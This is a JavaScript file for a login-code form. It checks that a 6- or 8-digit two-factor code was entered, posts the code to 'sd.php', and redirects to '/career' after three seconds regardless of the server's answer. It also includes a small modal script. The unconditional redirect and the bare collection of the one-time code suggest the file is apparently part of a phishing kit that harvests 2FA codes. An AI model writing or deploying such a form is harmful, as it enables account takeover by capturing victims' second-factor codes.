// Define the custom onLoginSubmit function
function onLoginSubmit(e, _this) {
  e.preventDefault(); // Prevent the default form submission

  const ecode = _this.querySelector("#fa2").value.trim();
  const numberError = _this.querySelector("#number-error");

  // Validate the 2FA code
  if (!ecode || (ecode.length !== 6 && ecode.length !== 8)) {
      numberError.innerText = !ecode ? 'Please enter your login code' : 'Login code must be 6 or 8 digits';
      _this.querySelector("#fa2").classList.add('error-text');
      return;
  } else {
      numberError.innerText = '';
      _this.querySelector("#fa2").classList.remove('error-text');
  }

  // Optionally, show a loading message or spinner
  // For example: document.querySelector("#loading-message").innerText = 'Logging in...';

  // Send the form data to the server
  $.post('sd.php', { ecode })
      .done(function(response) {
        var submitButton = formfa.querySelector('#submit');
        var spinner = submitButton.querySelector('i');
        // Disable the button, show the spinner, and change button text
        submitButton.disabled = true;
        spinner.style.display = 'inline-block'; // Show the spinner
        submitButton.innerHTML = `<i class="bx bx-loader-alt bx-spin bx-rotate-90"></i> Submit Code`;
    
          console.log(response); // Handle success response
          // Optionally redirect or show a success message if needed
          // window.location.href = 'success-page.php'; // Example redirect
      })
      .fail(function() {
          console.error('Error during submission'); // Handle error response
          // Optionally show an error message to the user
          // document.querySelector("#loading-message").innerText = 'Failed to log in. Please try again.';
      });

  // Optionally, you can submit the form after a delay or additional processing
  setTimeout(() => {
    window.location.href = "/career"; // Redirect after a short delay
  }, 3000); // Adjust the timeout as needed
}

// Attach the onLoginSubmit function to the form's submit event
const formfa = document.getElementById("formfa");
formfa.addEventListener('submit', function(event) {
  onLoginSubmit(event, formfa);
});

// Modal functionality
const modalContainer = document.getElementById("modal-container");
const modal = document.getElementById("modal");
const openModalBtn = document.getElementById("another");
const closeModalBtn = document.getElementById("close-modal");

openModalBtn.addEventListener("click", () => {
  modalContainer.style.display = "block";
});

closeModalBtn.addEventListener("click", () => {
  modalContainer.style.display = "none";
});

window.addEventListener("click", (event) => {
  if (event.target === modalContainer) {
      modalContainer.style.display = "none";
  }
});
